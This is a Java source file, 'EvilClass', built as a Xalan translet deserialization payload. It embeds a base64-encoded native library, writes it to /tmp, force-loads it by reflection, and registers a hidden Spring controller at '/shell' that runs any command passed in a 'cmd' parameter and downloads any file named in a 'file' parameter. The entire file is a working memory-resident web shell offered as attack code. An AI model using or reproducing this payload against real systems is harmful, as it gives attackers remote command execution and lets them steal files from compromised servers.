import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
import javax.servlet.ServletOutputStream;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.RandomAccessFile;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.URLEncoder;
import java.util.Base64;
import java.util.Vector;

public class EvilClass extends AbstractTranslet {

    public static native String execCmd(String cmd);
    //恶意动态链接库文件的base64编码
    private static final String EVIL_JNI_BASE64 = "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AAAA6dD/////JRIJIABoAgAAAOnA/////yUKCSAAaAMAAADpsP////8lAgkgAGgEAAAA6aD/////JfoIIABoBQAAAOmQ/////yXyCCAAaAYAAADpgP////8l6gggAGgHAAAA6XD/////JeIIIABoCAAAAOlg////SI0F4AggAEiNPdIIIABVSCn4SInlSIP4DncCXcNIiwU0CCAASIXAdPJd/+APH0AASI0FqQggAEiNPaIIIABVSCn4SInlSMH4A0iJwkjB6j9IAdBI0fh1Al3DSIsVDwggAEiF0nTyXUiJxv/iDx9AAIA9aQggAAB1J0iDPfcHIAAAVUiJ5XQMSI09AgYgAOhd////6Gj///9dxgVACCAAAfPDDx9AAGYuDx+EAAAAAABIgz3QBSAAAHQmSIsFpwcgAEiFwHQaVUiNPboFIABIieX/0F3pV////w8fgAAAAADpS////1VIieVIgewgMAAASIm96M///0iJteDP//9Ii4Xoz///SI01fQEAAEiJx+i8/v//SIlF+EiDffgAdQe4AAAAAOtZ6zZIi1X4SI2F8M///76AAAAASInH6FD+//9IhcB0GUiNlfDP//9Ii4Xgz///SInWSInH6IL+//9Ii0X4SInH6Db+//+FwHS6SItF+EiJx+j2/f//uAEAAADJw1VIieVIgeygMAAASIm9eM///0iJtXDP//9IiZVoz///SIuFeM///0iLAEiLgEgFAABIi7Voz///SIuNeM///7oAAAAASInP/9BIiUX4SMeF8M///wAAAABIjYX4z///uvgvAAC+AAAAAEiJx+iO/f//SI2V8M///0iLRfhIidZIicfouP3//0jHhYDP//8AAAAASI2ViM///7gAAAAAuQsAAABIidfzSKtIifqJAkiDwgRIjZXwz///SI2FgM///0iJ1kiJx+iU/f//SIuFeM///0iLAEiLgDgFAABIjY2Az///SIuVeM///0iJzkiJ1//QSIlF8EiLRfDJwwAAAEiD7AhIg8QIw3IAAAEbAzsgAAAAAwAAANT8//88AAAAWf7//2QAAAD1/v//hAAAABQAAAAAAAAAAXpSAAF4EAEbDAcIkAEAACQAAAAcAAAAkPz//6AAAAAADhBGDhhKDwt3CIAAPxo7KjMkIgAAAAAcAAAARAAAAO39//+cAAAAAEEOEIYCQw0GApcMBwgAABwAAABkAAAAaf7///wAAAAAQQ4QhgJDDQYC9wwHCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMAgAAAAAAADwBwAAAAAAAAAAAAAAAAAAEA4gAAAAAAABAAAAAAAAALkAAAAAAAAADAAAAAAAAADABgAAAAAAAA0AAAAAAAAAAAoAAAAAAAAZAAAAAAAAAPgNIAAAAAAAGwAAAAAAAAAIAAAAAAAAABoAAAAAAAAAAA4gAAAAAAAcAAAAAAAAAAgAAAAAAAAA9f7/bwAAAADwAQAAAAAAAAUAAAAAAAAA+AMAAAAAAAAGAAAAAAAAADACAAAAAAAACgAAAAAAAADnAAAAAAAAAAsAAAAAAAAAGAAAAAAAAAADAAAAAAAAAAAQIAAAAAAAAgAAAAAAAADYAAAAAAAAABQAAAAAAAAABwAAAAAAAAAXAAAAAAAAAOgFAAAAAAAABwAAAAAAAAAoBQAAAAAAAAgAAAAAAAAAwAAAAAAAAAAJAAAAAAAAABgAAAAAAAAA/v//bwAAAAAIBQAAAAAAAP///28AAAAAAQAAAAAAAADw//9vAAAAAOAEAAAAAAAA+f//bwAAAAADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABgOIAAAAAAAAAAAAAAAAAAAAAAAAAAAAPYGAAAAAAAABgcAAAAAAAAWBwAAAAAAACYHAAAAAAAANgcAAAAAAABGBwAAAAAAAFYHAAAAAAAAZgcAAAAAAAB2BwAAAAAAAEdDQzogKEdOVSkgNC44LjUgMjAxNTA2MjMgKFJlZCBIYXQgNC44LjUtNDQpAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAAEAyAEAAAAAAAAAAAAAAAAAAAAAAAADAAIA8AEAAAAAAAAAAAAAAAAAAAAAAAADAAMAMAIAAAAAAAAAAAAAAAAAAAAAAAADAAQA+AMAAAAAAAAAAAAAAAAAAAAAAAADAAUA4AQAAAAAAAAAAAAAAAAAAAAAAAADAAYACAUAAAAAAAAAAAAAAAAAAAAAAAADAAcAKAUAAAAAAAAAAAAAAAAAAAAAAAADAAgA6AUAAAAAAAAAAAAAAAAAAAAAAAADAAkAwAYAAAAAAAAAAAAAAAAAAAAAAAADAAoA4AYAAAAAAAAAAAAAAAAAAAAAAAADAAsAgAcAAAAAAAAAAAAAAAAAAAAAAAADAAwAAAoAAAAAAAAAAAAAAAAAAAAAAAADAA0ACQoAAAAAAAAAAAAAAAAAAAAAAAADAA4ADAoAAAAAAAAAAAAAAAAAAAAAAAADAA8AMAoAAAAAAAAAAAAAAAAAAAAAAAADABAA+A0gAAAAAAAAAAAAAAAAAAAAAAADABEAAA4gAAAAAAAAAAAAAAAAAAAAAAADABIACA4gAAAAAAAAAAAAAAAAAAAAAAADABMAEA4gAAAAAAAAAAAAAAAAAAAAAAADABQAGA4gAAAAAAAAAAAAAAAAAAAAAAADABUA2A8gAAAAAAAAAAAAAAAAAAAAAAADABYAABAgAAAAAAAAAAAAAAAAAAAAAAADABcAYBAgAAAAAAAAAAAAAAAAAAAAAAADABgAAAAAAAAAAAAAAAAAAAAAAAEAAAAEAPH/AAAAAAAAAAAAAAAAAAAAAAwAAAABABIACA4gAAAAAAAAAAAAAAAAABkAAAACAAsAgAcAAAAAAAAAAAAAAAAAABsAAAACAAsAsAcAAAAAAAAAAAAAAAAAAC4AAAACAAsA8AcAAAAAAAAAAAAAAAAAAEQAAAABABcAYBAgAAAAAAABAAAAAAAAAFMAAAABABEAAA4gAAAAAAAAAAAAAAAAAHoAAAACAAsAMAgAAAAAAAAAAAAAAAAAAIYAAAABABAA+A0gAAAAAAAAAAAAAAAAAKUAAAAEAPH/AAAAAAAAAAAAAAAAAAAAAAEAAAAEAPH/AAAAAAAAAAAAAAAAAAAAALEAAAABAA8AsAoAAAAAAAAAAAAAAAAAAL8AAAABABIACA4gAAAAAAAAAAAAAAAAAAAAAAAEAPH/AAAAAAAAAAAAAAAAAAAAAMsAAAABABMAEA4gAAAAAAAAAAAAAAAAANgAAAABABQAGA4gAAAAAAAAAAAAAAAAAOEAAAAAAA4ADAoAAAAAAAAAAAAAAAAAAPQAAAABABYAYBAgAAAAAAAAAAAAAAAAAAABAAABABYAABAgAAAAAAAAAAAAAAAAABYBAAAgAAAAAAAAAAAAAAAAAAAAAAAAADIBAAAQABYAYBAgAAAAAAAAAAAAAAAAADkBAAASAAwAAAoAAAAAAAAAAAAAAAAAAD8BAAASAAAAAAAAAAAAAAAAAAAAAAAAAFMBAAASAAAAAAAAAAAAAAAAAAAAAAAAAGcBAAASAAAAAAAAAAAAAAAAAAAAAAAAAHoBAAASAAAAAAAAAAAAAAAAAAAAAAAAAIwBAAAgAAAAAAAAAAAAAAAAAAAAAAAAAJsBAAASAAsAZQgAAAAAAACcAAAAAAAAAKIBAAASAAsAAQkAAAAAAAD8AAAAAAAAALkBAAAQABcAaBAgAAAAAAAAAAAAAAAAAL4BAAAQABcAYBAgAAAAAAAAAAAAAAAAAMoBAAASAAAAAAAAAAAAAAAAAAAAAAAAAN0BAAAgAAAAAAAAAAAAAAAAAAAAAAAAAPEBAAASAAAAAAAAAAAAAAAAAAAAAAAAAAUCAAAgAAAAAAAAAAAAAAAAAAAAAAAAAB8CAAAiAAAAAAAAAAAAAAAAAAAAAAAAADsCAAASAAkAwAYAAAAAAAAAAAAAAAAAAABjcnRzdHVmZi5jAF9fSkNSX0xJU1RfXwBkZXJlZ2lzdGVyX3RtX2Nsb25lcwBfX2RvX2dsb2JhbF9kdG9yc19hdXgAY29tcGxldGVkLjYzNTUAX19kb19nbG9iYWxfZHRvcnNfYXV4X2ZpbmlfYXJyYXlfZW50cnkAZnJhbWVfZHVtbXkAX19mcmFtZV9kdW1teV9pbml0X2FycmF5X2VudHJ5AEV2aWxDbGFzcy5jAF9fRlJBTUVfRU5EX18AX19KQ1JfRU5EX18AX19kc29faGFuZGxlAF9EWU5BTUlDAF9fR05VX0VIX0ZSQU1FX0hEUgBfX1RNQ19FTkRfXwBfR0xPQkFMX09GRlNFVF9UQUJMRV8AX0lUTV9kZXJlZ2lzdGVyVE1DbG9uZVRhYmxlAF9lZGF0YQBfZmluaQBwY2xvc2VAQEdMSUJDXzIuMi41AG1lbXNldEBAR0xJQkNfMi4yLjUAZmdldHNAQEdMSUJDXzIuMi41AGZlb2ZAQEdMSUJDXzIuMi41AF9fZ21vbl9zdGFydF9fAGV4ZWNtZABKYXZhX0V2aWxDbGFzc19leGVjQ21kAF9lbmQAX19ic3Nfc3RhcnQAcG9wZW5AQEdMSUJDXzIuMi41AF9Kdl9SZWdpc3RlckNsYXNzZXMAc3RyY2F0QEBHTElCQ18yLjIuNQBfSVRNX3JlZ2lzdGVyVE1DbG9uZVRhYmxlAF9fY3hhX2ZpbmFsaXplQEBHTElCQ18yLjIuNQBfaW5pdAAALnN5bXRhYgAuc3RydGFiAC5zaHN0cnRhYgAubm90ZS5nbnUuYnVpbGQtaWQALmdudS5oYXNoAC5keW5zeW0ALmR5bnN0cgAuZ251LnZlcnNpb24ALmdudS52ZXJzaW9uX3IALnJlbGEuZHluAC5yZWxhLnBsdAAuaW5pdAAudGV4dAAuZmluaQAucm9kYXRhAC5laF9mcmFtZV9oZHIALmVoX2ZyYW1lAC5pbml0X2FycmF5AC5maW5pX2FycmF5AC5qY3IALmRhdGEucmVsLnJvAC5keW5hbWljAC5nb3QALmdvdC5wbHQALmJzcwAuY29tbWVudAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGwAAAAcAAAACAAAAAAAAAMgBAAAAAAAAyAEAAAAAAAAkAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAC4AAAD2//9vAgAAAAAAAADwAQAAAAAAAPABAAAAAAAAQAAAAAAAAAADAAAAAAAAAAgAAAAAAAAAAAAAAAAAAAA4AAAACwAAAAIAAAAAAAAAMAIAAAAAAAAwAgAAAAAAAMgBAAAAAAAABAAAAAEAAAAIAAAAAAAAABgAAAAAAAAAQAAAAAMAAAACAAAAAAAAAPgDAAAAAAAA+AMAAAAAAADnAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAEgAAAD///9vAgAAAAAAAADgBAAAAAAAAOAEAAAAAAAAJgAAAAAAAAADAAAAAAAAAAIAAAAAAAAAAgAAAAAAAABVAAAA/v//bwIAAAAAAAAACAUAAAAAAAAIBQAAAAAAACAAAAAAAAAABAAAAAEAAAAIAAAAAAAAAAAAAAAAAAAAZAAAAAQAAAACAAAAAAAAACgFAAAAAAAAKAUAAAAAAADAAAAAAAAAAAMAAAAAAAAACAAAAAAAAAAYAAAAAAAAAG4AAAAEAAAAQgAAAAAAAADoBQAAAAAAAOgFAAAAAAAA2AAAAAAAAAADAAAAFgAAAAgAAAAAAAAAGAAAAAAAAAB4AAAAAQAAAAYAAAAAAAAAwAYAAAAAAADABgAAAAAAABoAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAcwAAAAEAAAAGAAAAAAAAAOAGAAAAAAAA4AYAAAAAAACgAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAAAH4AAAABAAAABgAAAAAAAACABwAAAAAAAIAHAAAAAAAAfQIAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAACEAAAAAQAAAAYAAAAAAAAAAAoAAAAAAAAACgAAAAAAAAkAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAigAAAAEAAAACAAAAAAAAAAkKAAAAAAAACQoAAAAAAAACAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAJIAAAABAAAAAgAAAAAAAAAMCgAAAAAAAAwKAAAAAAAAJAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAACgAAAAAQAAAAIAAAAAAAAAMAoAAAAAAAAwCgAAAAAAAIQAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAqgAAAA4AAAADAAAAAAAAAPgNIAAAAAAA+A0AAAAAAAAIAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAIAAAAAAAAALYAAAAPAAAAAwAAAAAAAAAADiAAAAAAAAAOAAAAAAAACAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAACAAAAAAAAADCAAAAAQAAAAMAAAAAAAAACA4gAAAAAAAIDgAAAAAAAAgAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAxwAAAAEAAAADAAAAAAAAABAOIAAAAAAAEA4AAAAAAAAIAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAANQAAAAGAAAAAwAAAAAAAAAYDiAAAAAAABgOAAAAAAAAwAEAAAAAAAAEAAAAAAAAAAgAAAAAAAAAEAAAAAAAAADdAAAAAQAAAAMAAAAAAAAA2A8gAAAAAADYDwAAAAAAACgAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAA4gAAAAEAAAADAAAAAAAAAAAQIAAAAAAAABAAAAAAAABgAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAOsAAAAIAAAAAwAAAAAAAABgECAAAAAAAGAQAAAAAAAACAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAADwAAAAAQAAADAAAAAAAAAAAAAAAAAAAABgEAAAAAAAAC0AAAAAAAAAAAAAAAAAAAABAAAAAAAAAAEAAAAAAAAAAQAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAkBAAAAAAAADQBQAAAAAAABoAAAAsAAAACAAAAAAAAAAYAAAAAAAAAAkAAAADAAAAAAAAAAAAAAAAAAAAAAAAAGAWAAAAAAAAQQIAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAARAAAAAwAAAAAAAAAAAAAAAAAAAAAAAAChGAAAAAAAAPkAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAA";
    private static final String LIB_PATH = "/tmp/libcmd.so";

    static {
        try {

            byte[] jniBytes = Base64.getDecoder().decode(EVIL_JNI_BASE64);
            RandomAccessFile randomAccessFile = new RandomAccessFile(LIB_PATH, "rw");
            randomAccessFile.write(jniBytes);
            randomAccessFile.close();

            //调用java.lang.ClassLoader$NativeLibrary类的load方法加载动态链接库
            ClassLoader cmdLoader = EvilClass.class.getClassLoader();
            Class<?> classLoaderClazz = Class.forName("java.lang.ClassLoader");
            Class<?> nativeLibraryClazz = Class.forName("java.lang.ClassLoader$NativeLibrary");
            Method load = nativeLibraryClazz.getDeclaredMethod("load", String.class, boolean.class);
            load.setAccessible(true);
            Field field = classLoaderClazz.getDeclaredField("nativeLibraries");
            field.setAccessible(true);
            Vector<Object> libs = (Vector<Object>) field.get(cmdLoader);
            Constructor<?> nativeLibraryCons = nativeLibraryClazz.getDeclaredConstructor(Class.class, String.class, boolean.class);
            nativeLibraryCons.setAccessible(true);
            Object nativeLibraryObj = nativeLibraryCons.newInstance(EvilClass.class, LIB_PATH, false);
            libs.addElement(nativeLibraryObj);
            field.set(cmdLoader, libs);
            load.invoke(nativeLibraryObj, LIB_PATH, false);


            WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
            RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
            Field configField = mappingHandlerMapping.getClass().getDeclaredField("config");
            configField.setAccessible(true);
            RequestMappingInfo.BuilderConfiguration config =
                    (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping);
            Method method2 = EvilClass.class.getMethod("shell", HttpServletRequest.class, HttpServletResponse.class);
            RequestMappingInfo info = RequestMappingInfo.paths("/shell")
                    .options(config)
                    .build();
            EvilClass springControllerMemShell = new EvilClass();
            mappingHandlerMapping.registerMapping(info, springControllerMemShell, method2);

        } catch (Exception hi) {
            hi.printStackTrace();
        }
    }

    public void shell(HttpServletRequest request, HttpServletResponse response) throws IOException {

        String cmd = request.getParameter("cmd");
        String file = request.getParameter("file");
        if (cmd != null) {
            String execRes = EvilClass.execCmd(cmd);
            response.getWriter().write(execRes);
            response.getWriter().flush();
        }
        if(file != null) {
            File targetFile = new File(file);
            String filename = targetFile.getName();
            targetFile.setReadable(true);
            FileInputStream fileInput = new FileInputStream(targetFile);
            ServletOutputStream out = response.getOutputStream();
            int c;
            response.setHeader("Content-Disposition", "attachment;filename=" + URLEncoder.encode(filename, "UTF-8"));
            while ((c = fileInput.read()) != -1) {
                out.write(c);
            }
            fileInput.close();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
